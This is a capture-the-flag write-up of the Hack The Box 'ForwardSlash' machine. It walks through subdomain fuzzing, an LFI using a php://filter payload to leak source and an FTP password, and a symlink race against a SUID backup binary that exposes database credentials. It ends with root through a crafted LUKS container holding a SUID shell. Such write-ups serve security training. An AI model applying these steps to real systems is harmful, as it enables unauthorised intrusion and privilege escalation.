nmap scan 

```
sudo nmap -p- --min-rate 10000 -oA nmap 10.10.10.183
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

### Enumerating port 80

We have to add `forwardslash.htb` to `/etc/hosts`
Here's the webpage:

![image1](/assets/images/htb-forwardslash/forwardslash1.png)

Fuzzing subdomains:

```bash
wfuzz -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.forwardslash.htb" --hh 0 -t 100 forwardslash.htb
000000055:   302        0 L      6 W      33 Ch       "backup" 
```

There's `backup.forwardslash.htb`:

### Enumerating backup subdomain

![image2](/assets/images/htb-forwardslash/forwardslash2.png)

Trying with default credentials doesn't give result, so I'll create an account, here's the main page:

![image3](/assets/images/htb-forwardslash/forwardslash3.png)

Using gobuster to find hidden directories:

```bash
sudo gobuster -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://backup.forwardslash.htb/ -t 40
/dev (Status: 301)
```

If we go here we get a `403` Access Denied.

Going to *Change your profile picture* we have this:

![image4](/assets/images/htb-forwardslash/forwardslash4.png)

Using the dev tools we see that is disabled, and we can enable it, by removing the `disabled=""`

![image5](/assets/images/htb-forwardslash/forwardslash5.png)

![image6](/assets/images/htb-forwardslash/forwardslash6.png)

Here's the request into burp:

![image7](/assets/images/htb-forwardslash/forwardslash7.png)

### Exploting LFI

We can try LFI, and test if we can see `/etc/passwd`:

![image8](/assets/images/htb-forwardslash/forwardslash8.png)

We can see `http://backups.forwardslash.htb/dev`:

![image9](/assets/images/htb-forwardslash/forwardslash9.png)

Knowing that is made with php, we can try LFI with: `php://filter/convert.base64-encode/resource=` and we get the output b64 encoded, so I'll try to get the `index.php` of `/dev`:

![image10](/assets/images/htb-forwardslash/forwardslash10.png)

Base64 decode it:

```bash
cat b64-index.php | base64 -d > index.php
```

Viewing the source code I find this:

```
if (@ftp_login($conn_id, "chiv", 'N0bodyL1kesBack/')) {
```

We can use this password to login with ssh

```bash
ssh chiv@10.10.10.183
```

### Enumerating as chiv

Running linpeas there's a SUID file called `backup`

```bash
[+] SUID - Check easy privesc, exploits and write perms
-r-sr-xr-x 1 pain   pain             14K Mar  6  2020 /usr/bin/backup
```

```bash
/usr/bin/backup 
----------------------------------------------------------------------
        Pain's Next-Gen Time Based Backup Viewer
        v0.1
        NOTE: not reading the right file yet, 
        only works if backup is taken in same second
----------------------------------------------------------------------

Current Time: 17:38:24
ERROR: 57d05eedecbdef988d4e52a0e9d2ebab Does Not Exist or Is Not Accessible By Me, Exiting...
```

`57d05eedecbdef988d4e52a0e9d2ebab` looks like md5sum, and it's the binary it's giving us the time, and everytime I run it, the string changes so I'll md5sum the time and check if it's the same:

```bash
echo -n 17:38:24 | md5sum
57d05eedecbdef988d4e52a0e9d2ebab  -
```

It is doing md5sum, we can use ltrace to see what it does:

![image11](/assets/images/htb-forwardslash/forwardslash11.png)

It is doing the md5 hash of the date, and then accessing a file with the name of the md5. 

We can exploit this by creating a symlink with the name of the md5sum of the date, and try to read a file that `pain` can read.

We can see wich file owns pain:

```bash
find / -user pain 2>/dev/null
/var/backups/config.php.bak
/usr/bin/backup
/home/pain
/home/pain/.bash_history
/home/pain/.cache
/home/pain/.profile
/home/pain/user.txt
/home/pain/.gnupg
/home/pain/.bashrc
/home/pain/.local
/home/pain/.local/share
/home/pain/.bash_logout
/home/pain/.ssh
/home/pain/encryptorinator
/home/pain/encryptorinator/encrypter.py
/home/pain/encryptorinator/ciphertext
/home/pain/note.txt
```

So I'll try to read `/var/backups/config.php.bak`:

```bash
ln -s /var/backups/config.php.bak $(date | cut -d ' ' -f4 | tr -d $'\n' | md5sum | cut -d ' ' -f1) ; /usr/bin/backup 
----------------------------------------------------------------------
        Pain's Next-Gen Time Based Backup Viewer
        v0.1
        NOTE: not reading the right file yet, 
        only works if backup is taken in same second
----------------------------------------------------------------------

Current Time: 16:37:00
<?php
/* Database credentials. Assuming you are running MySQL
server with default setting (user 'root' with no password) */
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'pain');
define('DB_PASSWORD', 'db1f73a72678e857d91e71d2963a1afa9efbabb32164cc1d94dbc704');
define('DB_NAME', 'site');
 
/* Attempt to connect to MySQL database */
$link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);
 
// Check connection
if($link === false){
    die("ERROR: Could not connect. " . mysqli_connect_error());
}
?>
```

We have a password: `db1f73a72678e857d91e71d2963a1afa9efbabb32164cc1d94dbc704`, and we can ssh as pain with this password.

```bash
ssh pain@10.10.10.183
```

### Enumerating as pain

In the home directory there's a note:

```
cat note.txt 
Pain, even though they got into our server, I made sure to encrypt any important files and then did some crypto magic on the key... I gave you the key in person the other day, so unless these hackers are some crypto experts we should be good to go.

-chiv
```

Listing the content of the `encryptorinator` directory we have this two files:

```bash
ls -la
total 16
drwxr-xr-x 2 pain root 4096 Mar 24  2020 .
drwxr-xr-x 7 pain pain 4096 Mar 17  2020 ..
-rw-r--r-- 1 pain root  165 Jun  3  2019 ciphertext
-rw-r--r-- 1 pain root  931 Jun  3  2019 encrypter.py
```

`ciphertext`:

```bash
cat ciphertext 
,L
>2Xբ
|?I)E-˒\/;y[w#M2ʐY@'缘泣,P@5f$\*rwF3gX}i6~KY'%e>xo+g/K>^Nke
```

`encrypter.py`:

```python
cat encrypter.py 
def encrypt(key, msg):
    key = list(key)
    msg = list(msg)
    for char_key in key:
        for i in range(len(msg)):
            if i == 0:
                tmp = ord(msg[i]) + ord(char_key) + ord(msg[-1])
            else:
                tmp = ord(msg[i]) + ord(char_key) + ord(msg[i-1])

            while tmp > 255:
                tmp -= 256
            msg[i] = chr(tmp)
    return ''.join(msg)

def decrypt(key, msg):
    key = list(key)
    msg = list(msg)
    for char_key in reversed(key):
        for i in reversed(range(len(msg))):
            if i == 0:
                tmp = ord(msg[i]) - (ord(char_key) + ord(msg[-1]))
            else:
                tmp = ord(msg[i]) - (ord(char_key) + ord(msg[i-1]))
            while tmp < 0:
                tmp += 256
            msg[i] = chr(tmp)
    return ''.join(msg)


print encrypt('REDACTED', 'REDACTED')
print decrypt('REDACTED', encrypt('REDACTED', 'REDACTED'))
```

sudo -l gives the next output:

```bash
sudo -l
Matching Defaults entries for pain on forwardslash:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pain may run the following commands on forwardslash:
    (root) NOPASSWD: /sbin/cryptsetup luksOpen *
    (root) NOPASSWD: /bin/mount /dev/mapper/backup ./mnt/
    (root) NOPASSWD: /bin/umount ./mnt/
```

### Privilege Escalation with Luks container

We can create a luks container with a SUID file on it an run it as root to escalate priviliges:

Create an empty virtual disk

```bash
sudo dd if=/dev/zero of=test.luks bs=1M count=64
64+0 records in                     
64+0 records out        
67108864 bytes (67 MB, 64 MiB) copied, 0.0642253 s, 1.0 GB/s
```

Initialize luks partion:

```bash
sudo cryptsetup luksFormat test.luks                          
WARNING!                      
========                      
This will overwrite data on test.luks irrevocably.                                                                                                  
Are you sure? (Type uppercase yes): YES                       
Enter passphrase for test.luks:         
Verify passphrase:
```

Open the encrypted container:

```bash
sudo cryptsetup luksOpen test.luks testtest                                
Enter passphrase for test.luks:
```

Create the filesystem:

```bash
sudo mkfs.ext4 /dev/mapper/testtest
ke2fs 1.45.5 (07-Jan-2020)
Creating filesystem with 12288 4k blocks and 12288 inodes

Allocating group tables: done                             
Writing inode tables: done                             
Creating journal (1024 blocks): done
Writing superblocks and filesystem accounting information: done
```

Mount it

```bash
sudo mount /dev/mapper/testtest /mnt/
```

Copy `/bin/bash` with the SUID:

```bash
sudo cp /bin/dash /mnt
sudo chmod 4777 /mnt/dash
```

Unmount it and close:

```bash
sudo umount /mnt
sudo cryptsetup luksClose testtest
```
Copy it to the machine:

```bash
scp test.luks pain@10.10.10.183:/dev/shm
```

Mount the image:

```bash
cd /dev/shm

sudo /sbin/cryptsetup luksOpen test.luks backup
Enter passphrase for test.luks: 

cd /
sudo /bin/mount /dev/mapper/backup ./mnt/
```

Run dash:

```bash
cd mnt/
./dash -p
# whoami
root
```
